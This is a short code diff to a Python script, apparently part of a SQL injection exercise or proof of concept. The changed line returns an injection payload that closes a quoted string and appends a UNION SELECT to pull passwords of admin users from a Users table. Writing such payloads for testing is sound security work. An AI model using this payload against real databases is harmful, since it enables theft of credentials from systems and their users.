@@ -4,7 +4,7 @@ import sqlite3
 import string
     
 def query():
-    return "34rr435' UNION SELECT password FROM Users WHERE admin=1; --"
+    return "DOESNOTEXIST' UNION SELECT password FROM Users WHERE admin=1; --"
     
     
 def main(argv):
